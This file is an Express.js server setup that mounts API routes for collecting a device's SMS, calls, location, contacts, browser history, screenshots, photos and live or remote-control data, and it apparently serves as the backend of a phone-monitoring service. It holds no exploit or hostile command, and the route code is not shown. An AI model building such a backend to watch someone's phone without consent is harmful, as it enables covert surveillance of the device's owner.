const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();

// Security headers
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  contentSecurityPolicy: false
}));

// CORS
app.use(cors({
  origin: process.env.CORS_ORIGIN || '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

// Rate limiting (memory-based, okay for single-instance)
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX) || 1000,
  message: { error: 'Too many requests, try again later' }
});
app.use('/api', limiter);

// Request logging
app.use(morgan(process.env.NODE_ENV === 'production' ? 'combined' : 'dev'));

// Body parsing
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Static files
app.use('/admin', express.static(path.join(__dirname, '..', 'admin')));

// Routes
app.use('/api/auth', require('../routes/auth'));
app.use('/api/devices', require('../routes/devices'));
app.use('/api/sms', require('../routes/sms'));
app.use('/api/mms', require('../routes/mms'));
app.use('/api/calls', require('../routes/calls'));
app.use('/api/locations', require('../routes/locations'));
app.use('/api/geofence', require('../routes/geofence'));
app.use('/api/apps', require('../routes/apps'));
app.use('/api/contacts', require('../routes/contacts'));
app.use('/api/calendar', require('../routes/calendar'));
app.use('/api/browser', require('../routes/browser'));
app.use('/api/screenshot', require('../routes/screenshot'));
app.use('/api/pictures', require('../routes/pictures'));
app.use('/api/chat', require('../routes/chat'));
app.use('/api/remote', require('../routes/remote'));
app.use('/api/live', require('../routes/live'));
app.use('/api/schedule', require('../routes/schedule'));
app.use('/api/files', require('../routes/files'));
app.use('/api/alerts', require('../routes/alerts'));
app.use('/api/stats', require('../routes/stats'));
app.use('/api/dashboard', require('../routes/dashboard'));
app.use('/api/sms-commands', require('../routes/sms-commands'));
app.use('/api/sim', require('../routes/sim'));
app.use('/api/settings', require('../routes/settings'));
app.use('/api/blocked', require('../routes/blocked'));
app.use('/api/notifications', require('../routes/notifications'));
app.use('/api/device', require('../routes/device'));

// Health check
app.get('/api/health', (req, res) => {
  const memory = process.memoryUsage();
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    routes: app._router?.stack?.filter(r => r.route || r.name === 'router').length || 27,
    memory: { heapUsed: Math.round(memory.heapUsed / 1024 / 1024) + 'MB' },
    env: process.env.NODE_ENV || 'production',
    platform: 'vercel-serverless'
  });
});

// Root redirect
app.get('/', (req, res) => res.redirect('/admin/'));

// 404
app.use((req, res) => {
  res.status(404).json({ error: 'Route not found', path: req.path });
});

// Error handler
app.use((err, req, res, next) => {
  console.error(`[ERROR] ${err.message}`, err.stack);
  const status = err.status || 500;
  res.status(status).json({
    error: status === 500 ? 'Internal server error' : err.message,
    ...(process.env.NODE_ENV !== 'production' && { stack: err.stack })
  });
});

module.exports = app;